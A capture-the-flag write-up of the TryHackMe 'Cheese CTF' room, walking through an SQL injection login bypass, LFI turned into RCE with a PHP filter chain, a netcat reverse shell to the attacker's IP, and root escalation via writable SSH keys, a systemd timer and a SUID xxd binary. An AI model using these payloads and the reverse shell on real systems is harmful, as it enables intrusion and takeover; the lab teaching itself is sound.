---
title: "TryHackMe: Cheese CTF"
author: jaxafed
categories: [TryHackMe]
tags: [web, portspoofing, sqli, lfi, rce, ssh, service, timer, suid, sudo]
render_with_liquid: false
media_subpath: /images/tryhackme_cheese_ctf/
image:
  path: room_image.webp
---

Cheese CTF was a straightforward room where we used SQL injection to bypass a login page and discovered an endpoint vulnerable to `LFI`. By utilizing PHP filters chain to turn the `LFI` into `RCE`, we gained a foothold on the machine. After that, we exploited a writable `authorized_keys` file to pivot to another user. As this user, we fixed a syntax error in a timer and used `sudo` privileges to start it, which allowed us to run a service that created a SUID binary. By exploiting this SUID binary, we were able to escalate our privileges to the `root` user.

[![Tryhackme Room Link](room_card.webp){: width="300" height="300" .shadow}](https://tryhackme.com/r/room/cheesectfv10){: .center }

## Initial Enumeration

### Nmap Scan

Scanning for open ports using `nmap` is largely ineffective in this room due to port spoofing, so we can skip that step.

### Web 80

By checking the most common ports, we can see that a custom web application is running on port `80`.

![Web 80 Index](web_80_index.webp){: width="1200" height="600" }

## Shell as www-data

### Discovering LFI

Clicking the login button on the index page redirects us to `/login.php`, where we encounter a login form.

![Web 80 Login](web_80_login.webp){: width="1200" height="600" }

After trying a couple of simple `SQL injection` payloads, we are able to bypass the login using the payload `' || 1=1;-- -` as the username.

![Web 80 Login SQL Injection](web_80_login_sql_injection.webp){: width="1200" height="600" }

After bypassing the login, we are redirected to `http://10.10.184.98/secret-script.php?file=supersecretadminpanel.html`, where the `file` parameter is particularly interesting. Additionally, by checking the other links on the page, we notice the application also uses the PHP filters in the `file` parameter.

![Web 80 Admin Panel](web_80_admin_panel.webp){: width="1200" height="600" }

> It is also possible to discover the `/secret-script.php` endpoint by fuzzing the web application for files, which reveals `messages.html` that links to it. Since there is no authentication mechanism, you can access it directly without logging in.
{: .prompt-tip }

Since the application seems to accept PHP filters, we can try using the `convert.base64-encode` filter to read the source code of the PHP pages. 

By examining the source code of `secret-script.php`, we see that it simply takes the `file` parameter and calls `include` with it.

```console
$ curl -s 'http://10.10.184.98/secret-script.php?file=php://filter/convert.base64-encode/resource=secret-script.php' | base64 -d
<?php
  //echo "Hello World";
  if(isset($_GET['file'])) {
    $file = $_GET['file'];
    include($file);
  }
?>
```
{: .wrap }

### RCE with PHP Filters Chain

At this point, we can achieve RCE using PHP filters chain, as described [here](https://www.synacktiv.com/en/publications/php-filters-chain-what-is-it-and-how-to-use-it).

First, we need to generate a payload using the [`php_filter_chain_generator.py`](https://github.com/synacktiv/php_filter_chain_generator).

```console
$ python3 php_filter_chain_generator.py --chain '<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.11.72.22 443 >/tmp/f"); ?>' | grep '^php' > payload.txt
```
{: .wrap }

Now, by sending our payload as the `file` parameter, we obtain a shell as the `www-data` user.

```console
$ curl -s "http://10.10.184.98/secret-script.php?file=$(cat payload.txt)"
```

```console
$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.11.72.22] from (UNKNOWN) [10.10.184.98] 40680
sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty;pty.spawn("/bin/bash");'
www-data@cheesectf:/var/www/html$ export TERM=xterm
export TERM=xterm
www-data@cheesectf:/var/www/html$ ^Z
zsh: suspended  nc -lvnp 443
$ stty raw -echo; fg
[1]  + continued  nc -lvnp 443
www-data@cheesectf:/var/www/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Shell as comte 

While checking for files writable by the `www-data` user, we discover `/home/comte/.ssh/authorized_keys`.

```console
www-data@cheesectf:/var/www/html$ find /  -type f -writable 2>/dev/null | grep -Ev '^(/proc|/snap|/sys|/dev)'
/home/comte/.ssh/authorized_keys
/etc/systemd/system/exploit.timer
```
{: .wrap }

To get a shell as the `comte` user, we can simply add an SSH key to the `authorized_keys` file.

First, we need to generate an SSH key.

```console
$ ssh-keygen -f id_ed25519 -t ed25519

$ cat id_ed25519.pub
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMh5/bXQHhNglSUiAYM7seONoiiQB7hVAr7HeeDaEIF0 kali@kali
```

Next, we write the public key to the `/home/comte/.ssh/authorized_keys` file.

```console
www-data@cheesectf:/var/www/html$ echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMh5/bXQHhNglSUiAYM7seONoiiQB7hVAr7HeeDaEIF0 kali@kali' > /home/comte/.ssh/authorized_keys
```
{: .wrap }

Now, using the private key, we can SSH into the system and obtain a shell as the `comte` user, allowing us to read the user flag.

```console
$ ssh -i id_ed25519 comte@10.10.184.98
...
comte@cheesectf:~$ id
uid=1000(comte) gid=1000(comte) groups=1000(comte),24(cdrom),30(dip),46(plugdev)
comte@cheesectf:~$ wc -c user.txt
4276 user.txt
```

## Shell as root

Checking the `sudo` privileges for the `comte` user, we see that we can reload the configuration files for `systemd` and manually start the `exploit.timer`, which will in turn trigger the execution of `exploit.service`.

```console
comte@cheesectf:~$ sudo -l
User comte may run the following commands on cheesectf:
    (ALL) NOPASSWD: /bin/systemctl daemon-reload
    (ALL) NOPASSWD: /bin/systemctl restart exploit.timer
    (ALL) NOPASSWD: /bin/systemctl start exploit.timer
    (ALL) NOPASSWD: /bin/systemctl enable exploit.timer
```

Upon checking the `exploit.timer`, we find that it is quite simple.

```console
comte@cheesectf:~$ cat /etc/systemd/system/exploit.timer
[Unit]
Description=Exploit Timer

[Timer]
OnBootSec=

[Install]
WantedBy=timers.target
```

And, checking the `exploit.service`, we see that when it runs, it copies the `xxd` binary to `/opt` and sets the `SUID` bit for the copied binary.

```console
comte@cheesectf:~$ cat /etc/systemd/system/exploit.service
[Unit]
Description=Exploit Service

[Service]
Type=oneshot
ExecStart=/bin/bash -c "/bin/cp /usr/bin/xxd /opt/xxd && /bin/chmod +sx /opt/xxd"
```

If we try to reload the configuration and start the `exploit.timer` as it is, we will see that it fails.

```console
comte@cheesectf:~$ sudo /bin/systemctl daemon-reload
comte@cheesectf:~$ sudo /bin/systemctl start exploit.timer
Failed to start exploit.timer: Unit exploit.timer has a bad unit file setting.
See system logs and 'systemctl status exploit.timer' for details.
comte@cheesectf:~$ systemctl status exploit.timer
● exploit.timer - Exploit Timer
     Loaded: bad-setting (Reason: Unit exploit.timer has a bad unit file setting.)
     Active: inactive (dead)
    Trigger: n/a
   Triggers: ● exploit.service
```

This is due to the `OnBootSec` value not being present in the unit configuration file.


```console
...
[Timer]
OnBootSec=
...
```
{: file="/etc/systemd/system/exploit.timer" }

From our previous enumeration, we already noted that the `exploit.timer` file was writable.

```console
comte@cheesectf:~$ ls -la /etc/systemd/system/exploit.timer
-rwxrwxrwx 1 root root 87 Mar 29 16:25 /etc/systemd/system/exploit.timer
```

So, we can simply add the missing value to the unit file to resolve the error.

```console
comte@cheesectf:~$ nano /etc/systemd/system/exploit.timer
comte@cheesectf:~$ cat /etc/systemd/system/exploit.timer
[Unit]
Description=Exploit Timer

[Timer]
OnBootSec=5s

[Install]
WantedBy=timers.target
```

Now, after reloading the configuration and starting the timer manually once more, we see that it successfully triggers the `exploit.service` and creates the `SUID` binary as expected.

```console
comte@cheesectf:~$ sudo /bin/systemctl daemon-reload
comte@cheesectf:~$ sudo /bin/systemctl start exploit.timer
comte@cheesectf:~$ systemctl status exploit.timer
● exploit.timer - Exploit Timer
     Loaded: loaded (/etc/systemd/system/exploit.timer; disabled; vendor preset: enabled)
     Active: active (elapsed) since Wed 2024-09-25 02:41:41 UTC; 4s ago
    Trigger: n/a
   Triggers: ● exploit.service
comte@cheesectf:~$ ls -la /opt
total 28
drwxr-xr-x  2 root root  4096 Sep 25 02:41 .
drwxr-xr-x 19 root root  4096 Sep 27  2023 ..
-rwsr-sr-x  1 root root 18712 Sep 25 02:41 xxd
```

Checking the [GTFObins](https://gtfobins.github.io/gtfobins/xxd/) page for the `xxd` binary, we see that it can be used for writing to files.

We can leverage this to add an SSH key for the `root` user.

```console
comte@cheesectf:~$ echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMh5/bXQHhNglSUiAYM7seONoiiQB7hVAr7HeeDaEIF0 kali@kali' | xxd | /opt/xxd -r - /root/.ssh/authorized_keys
```
{: .wrap }

Now, using the same key as before, we can SSH into the system and obtain a shell as the `root` user, allowing us to read the root flag.

```console
$ ssh -i id_ed25519 root@10.10.184.98
...
root@cheesectf:~# id
uid=0(root) gid=0(root) groups=0(root)
root@cheesectf:~# wc -c root.txt
321 root.txt
```

<style>
.center img {        
  display:block;
  margin-left:auto;
  margin-right:auto;
}
.wrap pre{
    white-space: pre-wrap;
}
</style>